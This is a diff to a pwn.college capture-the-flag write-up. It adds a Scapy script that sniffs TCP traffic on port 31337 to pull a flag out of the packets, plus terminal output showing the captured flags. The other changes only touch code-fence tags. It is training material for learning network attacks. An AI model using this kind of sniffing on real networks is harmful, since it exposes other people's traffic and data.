@@ -450,6 +450,37 @@ user_host.interactive(environ=parent_process.environ())
 
 We can use a simple Python script to capture the flag byte by byte and craft the complete flag.
 
+```py title="~/script.py" showLineNumbers
+from scapy.all import sniff, Raw
+
+buffer = b""
+
+def handle_packet(packet):
+    global buffer
+    if packet.haslayer(Raw):
+        buffer += bytes(packet[Raw])
+        if b'pwn.college{' in buffer and b'}' in buffer:
+            start = buffer.find(b'pwn.college{')
+            end = buffer.find(b'}', start)
+            if end != -1:
+                flag = buffer[start:end+1]
+                print(f"\nFlag captured: {flag.decode(errors='ignore')}")
+                exit(0)  # stop sniffing
+
+sniff(filter="tcp dst port 31337", prn=handle_packet)
+```
+
+```
+root@ip-10-0-0-1:/# python ~/script.py
+pwn.college{IL2Wo8FGsB4o4H7REi29XRi3yzx.dNzNzMDL4ITM0EzW}
+
+
+Flag captured: pwn.college{I4fIyKwkQexXwA6EYgWabI6ocRG.dRjNzMDL4ITM0EzW}
+```
+
+For some reason it prints some other flag-like string right after we run the script.
+This is not an issue in `ipython`.
+
 ```py
 In [1]: from scapy.all import sniff, Raw
    ...: 
@@ -927,7 +958,7 @@ s = socket.create_connection(("10.0.0.2", 31337))
 input("Holding connections open...\n")
 ```
 
-```py
+```
 root@ip-10-0-0-1:~# python ~/script.py
 Holding connections open...
 pwn.college{YEX2Ry1o2FmWPH-DALp2yFdHjNO.QX3UDM2EDL4ITM0EzW}
@@ -1016,7 +1047,7 @@ for i in range(100):
 input("Holding connections open...\n")
 ```
 
-```py
+```
 root@ip-10-0-0-1:/# python ~/script.py
 Held 0 connections
 Held 1 connections
